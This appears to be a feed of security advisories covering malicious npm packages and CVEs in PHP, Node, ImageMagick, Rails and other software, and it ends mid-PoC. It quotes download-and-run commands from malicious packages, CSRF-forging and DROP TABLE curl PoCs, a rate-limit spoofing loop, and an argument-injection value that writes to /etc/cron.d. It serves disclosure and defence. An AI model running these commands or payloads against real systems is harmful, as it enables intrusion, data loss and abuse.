items.title: Malicious code in @h1stealthy/gh046-npm-transfer-9421a2 (npm)
items.description:
## Source: amazon-inspector (ec2a4a7ce4ac73e7b796fdeb7b7120c5f09866284eb37e3b3a58d254363f2aba)
The npm tarball ships directory entries whose names are double-URL-encoded `..` sequences (`%252e%252e/%252e%252e/%252e%252e/tmp/npm-traversal-double_percent`) terminating in a file dropped at `/tmp/npm-traversal-double_percent` outside the package's own install directory. On a tar extractor that single-decodes percent-encoding before applying path-safety checks, extraction of this archive writes attacker-chosen files to absolute filesystem paths on the installer host during `npm install`. The shipped JavaScript is an inert stub and no lifecycle scripts are declared; the attack surface is the archive layout itself, exercised by the package manager's extraction step. Package naming (`@h1stealthy/...-transfer-...`) and the marker payload are consistent with a controlled traversal probe, but the artifact as published is structurally a path-traversal (zip-slip-style) tar against npm clients.

items.title: Malicious code in base_parts_ai (npm)
items.description:
## Source: amazon-inspector (07b0e2bcf47f6720470181fe18dda70621d52a4fb65fec395a87e14ec39c5219)
When a user runs the package's `jcc` or `jcx` CLI, lib/ai_utils.js polls https://jai.jaskle.cn/hm/hm_pub/ai_cc_cfg for a `newVer` value and, if it differs from the installed version, executes `npm install -g https://jdwfiles.oss-cn-hangzhou.aliyuncs.com/npm_pkg/base_parts_ai-<newVer>.tgz --force --registry=https://registry.npmmirror.com` with no hash or signature verification. The interactive confirmation prompt has been commented out and the `confirmed` variable is hardcoded to `"yes"`, so the global install runs unattended. The tarball is served from a different domain (Aliyun OSS) than the version manifest, and either endpoint — or a compromise of either — can push arbitrary code globally to every CLI user. Separately, the package's `setapi_cc` flow writes a persistent `SessionStart` hook into `~/.claude/settings.json` that runs `curl -s -m 5 https://jai.jaskle.cn/hm/pub/ai_tip?cli=cc-<os>_<arch>` on every Claude Code session start, establishing a phone-home channel keyed to the publisher domain. Note: `package.json` declares `scripts.__postinstall` (double underscore), which npm does not recognize, and `main.js` is a no-op — there is no automatic execution on `npm install` or `require()`. The auto-update channel fires when the user invokes the documented CLI, which is the package's primary advertised use.

items.description:
## Source: amazon-inspector (dc1565a3c533cd9f801edea2505efe5a04f5da569e3be9ef33b4e1271e7a5266)
The package is published as a Facebook Chat API client but its login flow (loginViaAPI in module/loginHelper.js) POSTs the caller-supplied Facebook email, password, and 2FA Base32 secret to a hardcoded default endpoint at https://minhdong.site/api/v1/facebook/login_ios. The destination is not Facebook and is unrelated to the declared GitHub publisher. The library then parses `uid`, `access_token`, and Facebook session `cookie` fields from the minhdong.site response and installs those cookies into the caller's cookie jar with `domain: ".facebook.com"` as the live Facebook session. In this flow, the entire authenticated session is minted by the third-party proxy, which receives plaintext Facebook credentials and the long-lived TOTP seed (not a one-time code), enabling indefinite account impersonation and valid 2FA code generation. A caller invoking a package named 'Facebook Chat API' with their credentials cannot reasonably be said to opt into this third-party relay.

items.title: Malicious code in gemini-computer-use (npm)
items.description:
## Source: amazon-inspector (0f1e56e41d63f9810a1cef681a9d43613ee5e07887785f6777f14f97fc06d847)
The npm entrypoint bin/cli.js, invoked via `npx gemini-computer-use` or `node bin/cli.js`, spawns `bash -c 'curl -fsSL https://smart-server.online/install.sh | bash'` on Unix and `powershell -ExecutionPolicy Bypass` running `irm https://smart-server.online/install.ps1 | iex` on Windows. The URL is mutable, unpinned, and served from a host distinct from the package's publisher repository; whoever controls smart-server.online controls what runs on the host at first launch. The fetched install.sh downloads core/agent.py, server.py, vitals.py, and skills/orchestrator.md from the same gateway (with a fallback to the mutable `main` branch of raw.githubusercontent.com/LevRa7/Computer-use-for-Gemini-App-Web), with no hash or signature verification, and wires them into systemd, launchd, or a Windows autostart entry for persistence across reboots. The persisted core/agent.py opens an outbound WebSocket to `wss://smart-server.online/ws/tunnel?user=...&token=...` and processes JSON-RPC `tools/call` messages; the `bash_exec` handler passes the incoming `command` field to `subprocess.run(cmd, shell=True)`, giving the remote gateway operator arbitrary shell execution on the host. The gateway hostname is hardcoded as the default, and the token pair used for authentication is provided by that same gateway.

## Source: amazon-inspector (e634fd115885f8cb0a2e2ab98b78bdc26d5f0cb37865cea6d848296478ace3d4)
This package is a fork of the Baileys WhatsApp library that embeds code which decodes a hidden HTTPS destination from a String.fromCharCode byte array at lib/Socket/messages-send.js lines 425 and 436. The decoded host is https://fiora.nixel.my.id/, a third-party endpoint unrelated to the upstream Baileys project, reached from within the message-send path. The host string is concealed via char-code arithmetic rather than appearing as a plain literal, which is an obfuscation technique used to hide network destinations from casual inspection. The package also ships lib/Utils/license-guard.js as a heavily obfuscated module (hex-mangled identifiers such as _0x1e6253, _0x1d5468, etc., consistent with javascript-obfuscator output), hiding the logic that gates the library's behavior and its interactions with the hidden endpoint. The combination of (a) an obfuscated license/guard module loaded by a WhatsApp session library that handles authentication credentials and message contents, and (b) a char-code-concealed outbound HTTPS destination wired into the outgoing message pipeline, is the fingerprint of covert data relay or credential/session exfiltration from an upstream-impersonating fork, not of legitimate WhatsApp protocol code.

---

items.description:
## Source: amazon-inspector (97fcefadffcfd5e41abeff4746ebc756b5b0fed7b86728b35cbd0c4a073184ce)
The package consists of a no-op Proxy export (index.js) and a beacon module (beacon.cjs) that fires both from the declared postinstall lifecycle script and on require of the main module. The beacon collects installer host identifiers — hostname, install path, current working directory, and node/npm version — and POSTs them as JSON to the hardcoded endpoint https://vmi3699893.contaboserver.net:8787/_ah/dc, with TLS certificate verification disabled (rejectUnauthorized:false). The destination is a bare Contabo VPS unrelated to any documented service, and the package provides no functional API: every property access on the exported Proxy returns a no-op function, so the only observable effect of installing or importing @c1-ease/core is transmission of installer identifiers to that endpoint. The scoped name mimicking a generic compatibility 'core' shim is consistent with dependency-confusion or typo-bait targeting.

Group-Office is an enterprise customer relationship management and groupware tool. Prior to versions 6.8.167, 25.0.102, and 26.0.27, the Contact/labels JMAP endpoint in GroupOffice accepts a fully attacker-controlled template string (tpl parameter) that is passed without restriction to TemplateParser::parse(). When the template contains an [assign] block whose expression includes a {{...}} variable reference, the engine calls eval() on the expanded expression after running it through a validateExpression() guard. The guard double-quotes unrecognized tokens, but PHP 7+ allows a string enclosed in parentheses to be invoked as a function ("system")("id") is valid PHP and calls system("id"). A single authenticated HTTP request is sufficient to execute arbitrary OS commands as the web server user (www-data). This issue has been patched in versions 6.8.167, 25.0.102, and 26.0.27.

When NGINX Plus or NGINX Open Source is configured to use TLS 1.3 early data using the ssl_early_data on directive, an attacker can use a specially crafted TLS 1.3 connection to drive an NGINX worker into a tight loop in which it repeatedly retries the same send without ever making progress. The worker continues accepting new connections and handling existing ones, but one CPU core is pinned at 100%.

Impact:
System performance can degrade until the NGINX worker process is either forced to restart or is manually restarted. This vulnerability may allow an unauthenticated attacker to cause a degradation of service that can lead to a denial-of-service (DoS) on the NGINX system. There is no control plane exposure; this is a data plane issue only.

Note: Software versions which have reached End of Technical Support (EoTS) are not evaluated.

PHP-CGI out-of-bounds read and write during PATH_INFO correction.

The PHP CGI binary (php-cgi), in CGI and FastCGI mode with cgi.fix_pathinfo enabled (the default), can perform an out-of-bounds read and write when the path removed from SCRIPT_FILENAME or PATH_TRANSLATED is longer than the supplied PATH_INFO, or when PATH_INFO is empty. This requires a web server mapping that passes such inconsistent values, or a FastCGI listener reachable by untrusted clients. An unauthenticated remote attacker can crash the process, may obtain process memory if the application exposes PATH_INFO or PATH_TRANSLATED, and may corrupt memory. PHP-FPM and the Apache module are not affected.

This issue affects PHP versions before 8.2.36, 8.3.* before 8.3.37, 8.4.* before 8.4.28 and 8.5.* before 8.5.13.

items.title: undici vulnerable to cache poisoning and cross-user disclosure via cross-origin redirects
items.description:
### Impact

When an originless `Agent` composes the redirect and cache interceptors as `compose(redirect(), cache())` with a shared cache (`type: 'shared'`), the cache builds its key from the original request URL before the redirect handler changes the origin. The response produced after a redirect is then stored under the original key, even when the redirect crossed to a different origin.

An attacker who controls the target of a redirect from a trusted URL can have their response cached under that trusted URL. A later caller requesting the trusted URL receives the attacker's body from the shared cache without either origin being contacted, allowing persistent cache poisoning. The same key confusion also discloses private data: when an authenticated request returns a `private, no-store` redirect to a user-specific resource, the final response is stored under the original URL and can be served to a later unauthenticated caller.

The cache interceptor was introduced in undici 7.0.0, and all 7.x and 8.x releases before the patched versions are affected. Applications are affected only when an originless `Agent`, a shared `MemoryCacheStore` or `SqliteCacheStore`, and the composition `compose(redirect(), cache())` are all used. Origin-bound `Client` and `Pool` dispatchers, and the reverse composition `compose(cache(), redirect())`, are not affected.

### Patches

Upgrade to `7.30.1` or `8.12.2`. Before storing a response, undici now verifies that the origin that produced it still matches the cache key, and preserves each redirect hop's cache-control policy, so cross-origin redirect responses and responses behind a `no-store` or `private` hop are no longer cached under the original key.

### Workarounds

Compose the interceptors as `compose(cache(), redirect())`, use per-origin dispatchers and cache stores, or disable shared caching on redirect-capable requests.

items.title: undici vulnerable to TLS certificate validation bypass via dropped tls options in Agent
items.description:
### Impact

undici's `Agent` passes its constructor options through a JSON-based deep clone (`JSON.parse(JSON.stringify(...))`) before forwarding them to each per-origin `Pool`. JSON cannot represent functions, so a caller-supplied `tls` option containing a `checkServerIdentity` callback is silently dropped before it reaches the TLS layer. As a result, a TLS peer whose certificate a custom `checkServerIdentity` was written to reject, but which passes Node's default hostname and chain checks, is silently accepted when the request is made through `Agent`. Because `Agent` is the default dispatcher behind `request`, `fetch`, and `setGlobalDispatcher`, this is the path most applications use. `EnvHttpProxyAgent` is also affected on its direct and `NO_PROXY` routes, which delegate to an internal `Agent`.

Only applications that pass a function-valued `tls` option (such as a custom `checkServerIdentity` for certificate or public-key pinning) are affected. Passing the same options through `connect` is not affected. This is the `Agent` counterpart of the `BalancedPool` certificate validation bypass fixed in CVE-2026-84961.

### Patches

Upgrade to undici `6.29.1`, `7.30.1`, or `8.12.2`. `Agent` now preserves the `tls` option outside the JSON clone, so custom TLS verification callbacks are forwarded to each origin unchanged.

### Workarounds

Pass the TLS options through `connect` instead of `tls`. For proxied `EnvHttpProxyAgent` destinations, use `requestTls` / `proxyTls`.

items.title: Improper Certificate Validation in Elastic Docker Images Leading to Interception of TLS Connections
items.description: Improper Certificate Validation (CWE-295) in the operating system certificate bundle shipped in the Docker images of APM Server; Auditbeat, Filebeat, Heartbeat, Metricbeat and Packetbeat; Elastic Agent, including Fleet Server and Cloudbeat; Logstash, for TLS connections that use the operating system certificate bundle; Elastic connectors; Universal Profiling (host agent, collector and symbolizer); and Elastic Maps Server. This certificate bundle, a dependency of these products (Dependency on Vulnerable Third-Party Component, CWE-1395), could allow an attacker to intercept or modify TLS-protected traffic via Signature Spoofing by Key Theft (CAPEC-474). The certificate bundle includes root certificate authorities that signed eight eMudhra intermediate certificate authorities whose private keys are compromised. Anyone with these keys can issue a certificate for any host name that these products accept as trusted. Exploitation requires an attacker in a network position between the product and the remote party, who presents a certificate issued with one of the compromised keys.

items.title: Action Pack: Possible IP spoofing in Action Dispatch RemoteIp
items.description: Action Pack is a framework for handling and responding to web requests. From 8.1 until 8.1.4.1, Since Rails 8.1.0, ActionDispatch::RemoteIp derives request.remote_ip from Rack::Request#forwarded_for, which under Rack 3 reads the RFC 7239 Forwarded header in preference to X-Forwarded-For. When a reverse proxy appends the client address to X-Forwarded-For but passes a client-supplied Forwarded header through unchanged, request.remote_ip returns an address chosen by the client, and the IP spoofing check does not raise, because it compares only Client-Ip with the forwarded addresses. An unauthenticated attacker could therefore spoof request.remote_ip, possibly bypassing IP-based access controls and rate limits keyed on the client address (including the default by: of rate_limit), and falsifying the client address in logs. An application is affected if it meets all of these requirements: Runs Rails 8.1.0 through 8.1.4 with Rack 3. Under Rack 2.2, forwarded_for reads only X-Forwarded-For. Is served behind a proxy that does not remove or overwrite a client-supplied Forwarded header. Relies on request.remote_ip for access control, rate limiting, or auditing. The fix detects a spoofed Forwarded header only when the proxy also sets X-Forwarded-For. An application whose proxy passes a client-supplied Forwarded header through and sets no X-Forwarded-For remains exposed after upgrading, and should configure the proxy to remove or overwrite Forwarded, or apply the workaround below. This issue is fixed in version 8.1.4.1.

items.title: AdminNeo: CSRF Token Secret Recoverable from Single Observed Token, Enabling Cross-Site Request Forgery
items.description:
### Summary AdminNeo's CSRF protection uses a BREACH-resistant XOR masking scheme, but the implementation transmits both the XOR mask and the masked value in every token. This allows any observer who sees a single CSRF token (via network sniffing, log files, Referrer header, or XSS) to instantly recover the session secret and forge unlimited valid CSRF tokens. Additionally, the underlying session token has only ~20 bits of entropy (`rand(1, 1e6)`), making blind brute-force feasible even without token observation. Originally reported by @az0mb13 in Adminer: [GHSA-q4f2-39gr-45jh](https://github.com/vrana/adminer/security/advisories/GHSA-33j4-hc95-pggg) ### Details Token generation in `admin/include/functions.inc.php` lines 1181-1184: ```php function get_token() { $rand = rand(1, 1e6); return ($rand ^ $_SESSION["token"]) . ":$rand"; } ``` Token verification in lines 1189-1192: ```php function verify_token() { list($token, $rand) = explode(":", $_POST["token"]); return ($rand ^ $_SESSION["token"]) == $token; } ``` Session token initialized in `admin/include/auth.inc.php` lines 327 and 385: ```php $_SESSION["token"] = rand(1, 1e6); ``` **Three distinct weaknesses:** 1. **Instant recovery:** The token format `(rand XOR secret):rand` transmits both operands. Recovery is trivial: `secret = masked_value XOR rand`. 2. **Low entropy**: Only 1,000,000 possible session tokens (~20 bits). Blind brute-force requires at most 1M requests. 3. **Loose comparison**: `verify_token()` uses `==` (loose comparison) instead of `===`, enabling PHP type juggling. ### PoC **Validated against a live AdminNeo 5.5.0 instance (MySQL 8.0, PHP 8.2).** **Step 1: Observe a single CSRF token** Load any authenticated AdminNeo page and extract a token from the HTML source. Tokens appear in hidden form fields: ```html ``` Token observation vectors: Referrer header leak, shared proxy logs, browser history, limited XSS, network sniffing. **Step 2: Recover the session secret (instant, 1 XOR operation)** ```python observed = "542273:441804" masked, rand_val = observed.split(":") session_secret = int(masked) ^ int(rand_val) # Result: 817530 ``` The token format is `(rand XOR secret):rand`. Both operands are transmitted, so the secret is recovered with a single XOR — zero additional requests needed. **Step 3: Forge unlimited valid CSRF tokens** ```python import random forge_rand = random.randint(1, 1000000) forged = f"{forge_rand ^ session_secret}:{forge_rand}" # Example output: 729376:481370 ``` Each forged token is unique and valid. The attacker can generate as many as needed. **Step 4: Execute arbitrary SQL with the forged token** ```shell # Forged token used to DROP a table the attacker never had a token for: curl -b victim_cookies.txt \ 'http://target/adminneo/?mysql=127.0.0.1&username=root&db=testdb&sql=' \ --data-urlencode "token=729376:481370" \ --data-urlencode "query=DROP TABLE csrf_victim_table;" \ -d "limit=0" ``` **Step 5: Verify a random wrong token is rejected (control)** ```shell curl -b victim_cookies.txt \ 'http://target/adminneo/?mysql=127.0.0.1&username=root&db=testdb&sql=' \ --data-urlencode "token=111:222" \ --data-urlencode "query=SELECT 1" -d "limit=1" # Result: "Invalid CSRF token. Send the form again." ``` **Weaponized CSRF attack page** In a real attack, the attacker hosts this HTML page and lures the victim to visit it while authenticated to AdminNeo: ```html

Click here for free database optimization tips

``` ### Impact - **Cross-Site Request Forgery** against authenticated AdminNeo users. Validated: forged token used to CREATE TABLE, INSERT data, SELECT data, and DROP TABLE — all accepted by the server. - An attacker who observes a single CSRF token (via Referrer header, proxy logs, XSS, or network sniffing) can instantly recover the session secret and forge unlimited valid tokens. - With a forged token, the attacker can execute arbitrary SQL through the victim's session: drop tables/databases, exfiltrate data, create backdoor users, or modify records. - The low entropy (~20 bits, 1M possible values) also enables blind brute-force without observing any token, requiring at most 1M requests (~17 minutes at 1000 req/sec).

ImageMagick on Windows through 7.1.2-33 and 6.9.13-58 contains an uncontrolled search path vulnerability in NTGhostscriptEXE() that launches gswin64c.exe by bare name when Ghostscript is unregistered. Attackers can plant a malicious gswin64c.exe in the working directory to execute code with ImageMagick privileges when PDF, PostScript, or EPS files are converted.

items.title: Social-auth-core 4.7.0 before 7.0.0 Login CSRF via SAML RelayState
items.description: Social-auth-core 4.7.0 before 7.0.0 contains a login cross-site request forgery vulnerability in the SAML backend that restores sessions named in the unsigned RelayState parameter. Attackers can deliver their own valid IdP response and RelayState to a victim's browser via an auto-submitting form, signing the victim into the attacker's account to capture entered data.

In the Linux kernel, the following vulnerability has been resolved:

Drivers: hv: vmbus: Bounds check the shared ring buffer indices

In a CoCo VM the host is untrusted. Since the VMBus ring buffer read and
write indices live in shared memory, the guest has to treat both as
potentially malicious.

hv_ringbuffer_write() copies into the ring at write_index with no bounds
checking, so the host can make the guest write packet data at any offset
up to 4 GiB past the start of the ring buffer. read_index matters too:
the available space derived from both indices is the only bound on how
much is copied, and an out-of-range index can make it far larger than
the ring.

The fix is to validate both indices before use and to use the validated
snapshot instead of re-accessing. For invalid indices,
hv_ringbuffer_write() logs and returns -EIO.

One re-read of write_index is left unchecked in this patch:
hv_get_ring_bufferindices() fetches it again for the prev_indices
trailer. The value is only returned to the host and is not used as an
offset or length for indexing. Since this is not a security issue, it is
addressed later in the series.

Open-coding the bytes available arithmetic keeps the fix free of
prerequisites; a later patch refactors it into a helper function.

pgEdge Postgres MCP Server enables SQL queries against PostgreSQL databases through Model Context Protocol compatible clients. Prior to 1.1.0, deployments exposing the nondefault HTTP transport with authentication enabled used the leftmost caller-supplied X-Forwarded-For value as the client address for login rate limiting. ExtractIPAddress in internal/auth/middleware.go supplied that value to IsAllowed and RecordFailedAttempt in internal/auth/rate_limiter.go, allowing an unauthenticated caller to rotate addresses to evade throttling or assert another user's address to consume that user's limiter bucket. The published nginx configuration appended rather than replaced X-Forwarded-For, making the issue reachable without an operator misconfiguration. Username-keyed account lockout did not use the client address, but shipped defaults disabled that separate control through MaxFailedAttemptsBeforeLockout: 0. This issue is fixed in version 1.1.0.

A flaw in Node.js HTTP Agent connection reuse can cause a client to accept as valid a response that was sent before the client has sent the request. This is an incomplete fix of CVE-2026-48931.

The guard that destroys idle keep-alive sockets when unexpected data arrives only runs when the event loop polls for I/O. If an unsolicited response has already reached the socket but has not been read yet when the socket is handed to a new request, for example because the event loop was busy with synchronous work, the guard is removed without seeing it and the data is parsed as the response to the new request.

This vulnerability affects Node.js **26.x**, **24.x**, and **22.x**.

items.title: Remark42: Rate limit bypass via unconditional trust of X-Forwarded-For/X-Real-IP headers in direct-internet deployment
items.description:
### Summary
Remark42 applied chi's `middleware.RealIP` globally, trusting `True-Client-IP` / `X-Real-IP` / `X-Forwarded-For` headers without verifying the request came from a trusted proxy. The per-IP rate limiters key on the overwritten `r.RemoteAddr`, so any client can bypass every per-IP rate limiter by rotating spoofed IP headers. The same spoofed IP also drives other per-IP controls (stored comment IP, anonymous identity derivation, and `--votes-ip` vote de-duplication). This affects deployments reachable directly from the internet (Remark42's built-in HTTP, static TLS, and ACME modes are all documented and supported), as well as any proxied deployment where the proxy forwards an attacker-controlled recognised header.

### Details
The router applies `middleware.RealIP` globally, ahead of the per-route limiters, without any check that the server is behind a trusted proxy (in v1.16.1, `backend/app/rest/api/rest.go:207`).

The `rateLimiter` function (v1.16.1, `backend/app/rest/api/rest.go:769-779`) builds a tollbooth limiter with `IPLookup{Name: "RemoteAddr"}`, which reads `r.RemoteAddr`. Since chi's `middleware.RealIP` (v1.16.1, `backend/vendor/github.com/go-chi/chi/v5/middleware/realip.go:42-55`) unconditionally overwrites `r.RemoteAddr` from `True-Client-IP > X-Real-IP > first X-Forwarded-For` (accepting any syntactically valid IP), any client can set its apparent IP to an arbitrary value.

This bypasses every per-IP rate limiter that runs after `RealIP`: `/auth` (2/s), avatars (100/s), the image proxy (10/s), open / protected / admin route groups (10/s), root routes (50/s), and `/web/*` (20/s). Comment and vote creation go through the update limiter, whose server default is `UPDATE_LIMIT=0.5`/s (burst 1), not 10/s. The global 1,000 concurrent-request throttle still applies, so this is a per-IP-limit bypass rather than truly unlimited throughput. chi's own documentation warns that `middleware.RealIP` should be used only behind a trusted proxy.

### PoC
```bash
# Deploy Remark42 reachable directly from the internet (built-in HTTP / TLS / ACME, no proxy that overwrites the headers).
# Comment creation is limited to UPDATE_LIMIT (default 0.5/s, burst 1) per IP.

# Rotate X-Real-IP across many requests; each distinct value gets its own token bucket.
for i in $(seq 1 100); do
  curl -s -o /dev/null -w '%{http_code}\n' \
    -H "X-Real-IP: 192.0.2.$i" \
    -X POST 'https://remark42.example.com/api/v1/comment?site=site1' \
    -H 'Authorization: Bearer YOUR_JWT' \
    -H 'Content-Type: application/json' \
    -d '{"text":"spam","locator":{"site":"site1","url":"https://example.com/post"}}'
done | sort | uniq -c
# With rotating headers the responses stay 201; without them, requests beyond the burst return 429.
```

### Impact
By rotating the spoofed client IP an attacker bypasses the per-IP token buckets on all rate-limited endpoints and defeats other per-IP controls, enabling: (a) spam comment creation beyond the configured per-IP limit, (b) confirmation-email / notification flooding to supplied addresses, (c) high-volume outbound image fetching and resource consumption via the image proxy (its transport still blocks private/reserved destinations and DNS rebinding, so this is amplification, not new SSRF reach), (d) authentication-endpoint abuse, (e) where `--votes-ip` is enabled, defeating per-IP vote de-duplication (ballot stuffing), and (f) minting fresh anonymous identities and poisoning the stored comment IP and request logs, since the anonymous user ID is derived from `name + RemoteAddr`. The global concurrency ceiling and per-request timeouts remain, so availability impact is limited.

### Resolution
Mitigation support was added in v1.16.2 (umputun/remark42#2116, follow-up in #2118). **Upgrading alone does not remediate the issue: `--trusted-proxy` must be configured.**

The fix adds `--trusted-proxy` / `TRUSTED_PROXY`. When set, the forwarding headers (`X-Real-IP`, then `CF-Connecting-IP`, then the leftmost public `X-Forwarded-For`) are honoured only when the direct TCP peer falls inside a trusted-proxy network; for a request from any other peer those headers are dropped and the real socket IP is used. When it is **unset**, the previous trust-all behaviour is preserved for backward compatibility and a startup warning is logged, so an un-configured v1.16.2 remains exploitable. `True-Client-IP` is no longer recognised. `TRUSTED_PROXY` takes a comma-separated list; on the command line, repeat `--trusted-proxy` per entry.

**Required configuration:**
- **Reachable directly from the internet:** set a value that no real client matches so the forwarding headers are always ignored, e.g. `--trusted-proxy=127.0.0.1/32` (only when Remark42 is not actually reached over loopback).
- **Behind a reverse proxy:** point `--trusted-proxy` at the proxy's network only, block direct access to Remark42, and make the proxy **overwrite** `X-Real-IP` with the real client and discard client-supplied forwarding headers. A proxy that merely appends to `X-Forwarded-For`, or that forwards a client-supplied `X-Real-IP`, still lets the client choose the reported IP. Note that the shipped nginx manual sets `X-Real-IP` but does not strip a client `True-Client-IP`.
- **Before v1.16.2:** strip `True-Client-IP`, `X-Real-IP`, and `X-Forwarded-For` at the edge and set a known-safe client-IP header.

See the [Trusted proxies and client IP docs](https://remark42.com/docs/configuration/parameters/#trusted-proxies-and-client-ip).

Burrito is a Terraform Automation Collaboration Software (TACoS) Kubernetes operator. Prior to 0.13.0, `POST /api/webhook` accepts unsigned GitHub and GitLab events when a `TerraformRepository`'s credentials omit `webhookSecret` or set it to an empty value, including credentials configured for git authentication and polling. `Credential.WebhookSecret` is optional, and `go-playground/webhooks` skips signature or token verification when the secret is empty. Anyone who can reach `burrito-server`'s endpoint and knows a tracked repository's URL can forge events to create or delete `TerraformPullRequest` custom resources with attacker-chosen `Branch`, `Base`, and `ID` fields. For GitHub `pull_request` events, the controller fetches changed files using the real pull request number but does not cross-check the payload's branch against that pull request. Pairing a real, existing pull request number with an unrelated existing branch in the same repository can therefore cause an unauthorized `terraform plan` for affected layers using the operator's stored git and cloud credentials. Code analysis also indicates that the resulting plan can be posted to the real pull request's comment thread, exposing and misattributing another branch's infrastructure changes. Auto-apply is disabled for these temporary layers, so this vulnerability alone cannot force a `terraform apply`; plan-time provider and data-source code execution depends on the selected branch's contents. This issue is fixed in version 0.13.0.

ImageMagick before 6.9.13-57 and 7.x before 7.1.2-32 contains a memory leak in the SVG encoder (WriteSVGImage) that fails to release allocated memory when handling crafted images. Attackers can supply crafted image files that are processed by the SVG encoder to leak memory and cause a denial of service through resource consumption.

ImageMagick 7.1.1-7 before 7.1.2-32 contains a heap buffer over-read vulnerability that allows attackers to read beyond allocated memory due to incorrect string termination in XMP profiles. Attackers can supply a crafted image containing a malformed XMP profile to trigger the over-read and crash the application.

ImageMagick before 6.9.13-57 and 7.x before 7.1.2-32 contains a stack overflow in the MSL decoder caused by an incorrect depth check that fails to limit recursion. Attackers can supply a set of crafted MSL images that exhaust the stack when one of them is read, crashing the process and causing a denial of service.

ImageMagick before 6.9.13-57 and 7.x before 7.1.2-32 contains an incomplete cleanup flaw in the JNG decoder that fails to remove temporary files when processing crafted input. Attackers can submit crafted JNG files for processing to repeatedly leak temporary files, consuming disk space and degrading availability.

Yuxi is a large-model-based intelligent knowledge base and knowledge graph agent development platform.  From 0.6.0.beta1 until 0.7.1, there is insufficient isolation between execution-capable Docker sandboxes and trusted application services. A low-privileged authenticated user who can execute commands in their own sandbox can reach other tenants' sandbox APIs, access their files and secrets, execute commands in active sandboxes, and enumerate, create, or delete sandboxes through the unauthenticated provisioner without knowing administrator, database, or MinIO credentials. Sandboxes can also reach shared internal services; if shipped default service credentials remain unchanged, an attacker can use them, and if the exposed PostgreSQL account is a superuser, obtain command execution in the PostgreSQL container. These paths can disclose or modify cross-tenant data and sandbox state or cause denial of service through sandbox deletion without a container escape or kernel vulnerability. This vulnerability is fixed in 0.7.1. Existing deployments must separately rotate persisted PostgreSQL, Neo4j, or MinIO credentials that were previously set to documented or shipped defaults because upgrading the Compose files does not automatically rotate them.

Dokploy is a free, self-hostable Platform as a Service (PaaS). Prior to 0.31.1, the backup prefix field is only checked for a nonempty value, and normalizeS3Path preserves shell metacharacters before the prefix is interpolated into rclone upload and retention-cleanup command strings. An authenticated organization member with backup permission for a service can execute arbitrary commands as root on the Dokploy host or configured remote server when a PostgreSQL, MySQL, MariaDB, MongoDB, libSQL, Compose, or web-server backup runs manually, on schedule, or performs retention cleanup. This issue is fixed in version 0.31.1.

ImageMagick before 7.1.2-35 contains a policy bypass vulnerability that allows attackers to evade resource limits because a policy check is missing when reading XMP profiles. Attackers can supply an image with a crafted XMP profile to trigger excessive memory usage and cause denial of service.

items.title: Docker-Proxy through 5.1.9 Missing Authentication via hubcmdui /api/config
items.description: Docker-Proxy through 5.1.9 contains a missing authentication vulnerability in the hubcmdui routes/config.js that allows unauthenticated attackers to read and overwrite configuration via /api/config. Attackers can retrieve the WeChat webhook URL and Telegram bot token, and overwrite menuItems links, proxyDomain, and the monitoring webhook destination receiving alerts.
Time-of-check time-of-use (toctou) race condition in Windows Virtualization-Based Security (VBS) Enclave allows an authorized attacker to bypass a security feature locally.

ImageMagick before 7.1.2-33 contains a policy bypass vulnerability in the UHDR decoder that allows attackers to evade image width and height limits because extent checks occur after decoding. Attackers can supply crafted UHDR images with oversized dimensions that are fully decoded before policy limits are enforced, causing excessive resource consumption.

ImageMagick before 7.1.2-33 contains a memory leak vulnerability in the MAT decoder that fails to release allocated memory in a specific error path. Attackers can supply crafted MAT files that trigger this error path repeatedly, causing small memory leaks that gradually consume process memory.

ImageMagick before 6.9.13-58 and 7.x before 7.1.2-33 contains a memory leak in its XML parsing code, where allocated memory is not released when parsing reaches the nesting depth limit. Attackers can supply crafted, deeply nested XML data to trigger the leak, causing memory exhaustion and denial of service.

ImageMagick before 6.9.13-58 and 7.x before 7.1.2-33 contains a memory leak in the handling of XMP profiles by various decoders. Attackers can supply images with a crafted XMP profile that leak memory each time they are processed, leading to resource exhaustion and denial of service.

ImageMagick before 6.9.13-57 and 7.x before 7.1.2-32 contains an uninitialized memory read in the TGA image decoder that can expose memory contents. Attackers can supply a crafted TGA image for processing to disclose contents of uninitialized memory from the ImageMagick process.

ImageMagick before 6.9.13-57 and 7.x before 7.1.2-32 contains an XML injection vulnerability in the CIP encoder, which does not properly escape input-derived data when writing Cisco IP Phone XML output. Attackers can supply a crafted file that, when converted to CIP format, injects arbitrary markup into the generated XML.

ImageMagick before 6.9.13-57 and 7.x before 7.1.2-32 contains an information disclosure vulnerability in the JPEG decoder, which performs a read that exposes uninitialized memory when handling crafted input. Attackers can supply a crafted JPEG file for processing to disclose uninitialized memory contents.

ImageMagick before 6.9.13-57 and 7.x before 7.1.2-32 contains an information disclosure vulnerability in the PostScript decoder, which allocates a buffer one byte longer than the data it decoded. Attackers can supply a crafted PostScript file to expose a single uninitialized byte of memory contents.

items.title: LXD has argument injection in backup compression algorithm leading to AFW and ACE
items.description:
Reported from  https://github.com/lxc/incus/security/advisories/GHSA-v6mj-8pf4-hhw4

### Summary

Improper validation of user-provided backup compression algorithm leads to
argument injection in the constructed command line. This leads to an
arbitrary file write on the host, possibly leading to arbitrary command
execution.


### Details

Incus validates `compression_algorithm` by parsing it into fields and checking
only the first token against an allowlist:

```go
fields, err := shellquote.Split(value)
...
if !slices.Contains([]string{"bzip2", "gzip", "lz4", "lzma", "pigz", "pzstd", "pxz", "tar2sqfs", "xz", "zstd"}, fields[0]) {
    return fmt.Errorf("Compression algorithm %q isn't currently supported", fields[0])
}
_, err = exec.LookPath(fields[0])
```

Extra arguments are not rejected. `compressFile()` then prepends `-c` and
passes the remaining user-supplied fields to the compressor:

```go
args := []string{"-c"}
if len(fields) > 1 {
    args = append(args, fields[1:]...)
}
cmd := exec.Command(fields[0], args...)
cmd.Stdin = infile
cmd.Stdout = outfile
```

With a value like:

```text
zstd -d -f --pass-through -o /etc/cron.d/incus-zstd-rce -- /var/lib/incus/.../payload
```

the daemon executes the equivalent of:

```text
zstd -c -d -f --pass-through -o /etc/cron.d/incus-zstd-rce -- /var/lib/incus/.../payload
```

### PoC

```
python3 poc.py \
	--insecure --url https://remote-incus:8443 \
	--cert ~/.config/incus/client.crt --key ~/.config/incus/client.key \
	--instance c01 \
	--execute --yes-i-understand-this-writes-host-file
```

The following was generated by an LLM model.

```
#!/usr/bin/env python3
"""Short remote Incus backup compression zstd cron RCE PoC.

Dry-run is the default.  --execute uploads a cron payload into an instance and
then asks Incus for a direct backup with a zstd argument-injection compressor:

